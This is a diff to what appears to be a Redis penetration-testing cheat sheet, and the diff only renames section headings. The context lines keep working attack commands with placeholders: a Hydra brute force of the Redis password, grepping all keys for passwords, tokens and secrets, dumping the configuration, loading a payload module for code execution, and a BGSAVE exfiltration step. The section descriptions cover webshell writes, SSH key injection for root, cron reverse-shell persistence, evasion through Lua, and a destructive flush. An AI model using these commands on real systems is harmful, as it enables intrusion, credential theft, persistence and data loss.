@@ -4,7 +4,7 @@
 
 ---
 
-## Connect to Redis Server
+## connect authenticated
 Connect to remote Redis instance with optional password.
 
 ```bash
@@ -15,7 +15,7 @@ redis-cli -h {{TARGET:ip}} -p {{PORT:port:6379}} -a {{PASSWORD:str}}
 
 ---
 
-## Unauthenticated Info Probe
+## probe info unauthenticated
 Test for unauthenticated Redis instance.
 
 ```bash
@@ -26,7 +26,7 @@ redis-cli -h {{TARGET:ip}} -p {{PORT:port:6379}} INFO
 
 ---
 
-## Brute Force Redis Password
+## brute password hydra
 Use Hydra to crack Redis password.
 
 ```bash
@@ -37,7 +37,7 @@ hydra -P {{WORDLIST:wordlist:/usr/share/wordlists/rockyou.txt}} redis://{{TARGET
 
 ---
 
-## List All Keys
+## list all keys
 Enumerate every key in the database (slow on large DBs).
 
 ```bash
@@ -48,7 +48,7 @@ redis-cli -h {{TARGET:ip}} KEYS '*'
 
 ---
 
-## Scan for Keys (Iterative)
+## scan keys iterative
 Iterate keys with optional pattern (use on large datasets).
 
 ```bash
@@ -59,7 +59,7 @@ redis-cli -h {{TARGET:ip}} SCAN 0 MATCH '{{PATTERN:str:*}}' COUNT 100
 
 ---
 
-## Get Value of Key
+## get key value
 Retrieve value stored at a specific key.
 
 ```bash
@@ -70,7 +70,7 @@ redis-cli -h {{TARGET:ip}} GET {{KEY:str}}
 
 ---
 
-## Search Keys for Sensitive Strings
+## search keys sensitive strings
 Find keys with names containing password/token/secret.
 
 ```bash
@@ -81,7 +81,7 @@ redis-cli -h {{TARGET:ip}} KEYS '*' | grep -iE 'pass|token|secret|api'
 
 ---
 
-## Dump Configuration
+## dump config
 Inspect full Redis configuration for misconfigurations.
 
 ```bash
@@ -92,7 +92,7 @@ redis-cli -h {{TARGET:ip}} CONFIG GET '*'
 
 ---
 
-## Change Database Index
+## switch database index
 Switch to a different Redis logical database (0-15).
 
 ```bash
@@ -103,7 +103,7 @@ redis-cli -h {{TARGET:ip}} -n {{DB_INDEX:int:1}}
 
 ---
 
-## Write Webshell via CONFIG SET
+## write webshell config set
 Write a PHP webshell to webroot via Redis dbfilename.
 
 ```bash
@@ -117,7 +117,7 @@ redis-cli -h {{TARGET:ip}} SAVE
 
 ---
 
-## SSH Key Injection for Root Access
+## inject ssh key root privesc
 Inject SSH public key into authorized_keys via Redis.
 
 ```bash
@@ -131,7 +131,7 @@ redis-cli -h {{TARGET:ip}} SAVE
 
 ---
 
-## Cron Job Persistence
+## write cron job persistence
 Write a malicious cron job for persistent reverse shell.
 
 ```bash
@@ -145,7 +145,7 @@ redis-cli -h {{TARGET:ip}} SAVE
 
 ---
 
-## Module Load for Persistent RCE
+## load module rce
 Load malicious Redis module for persistent code execution (Redis 4.0+).
 
 ```bash
@@ -159,7 +159,7 @@ redis-cli -h {{TARGET:ip}} MODULE LOAD /tmp/payload.so
 
 ---
 
-## Background Save and Exfil
+## dump rdb bgsave exfil
 Trigger BGSAVE then download dump.rdb for offline analysis.
 
 ```bash
@@ -173,7 +173,7 @@ rdb --command json {{OUTFILE:file:dump.rdb}}
 
 ---
 
-## Live Command Monitor
+## monitor live commands
 Capture real-time commands executed against Redis.
 
 ```bash
@@ -184,7 +184,7 @@ redis-cli -h {{TARGET:ip}} MONITOR
 
 ---
 
-## Lua Eval for Stealthy Operations
+## eval lua evasion
 Execute commands via Lua scripting (often less monitored).
 
 ```bash
@@ -195,7 +195,7 @@ redis-cli -h {{TARGET:ip}} --eval 'return redis.call("SET",KEYS[1],ARGV[1])' {{K
 
 ---
 
-## Flush All Data
+## flush all data
 Delete all keys in all databases (destructive).
 
 ```bash
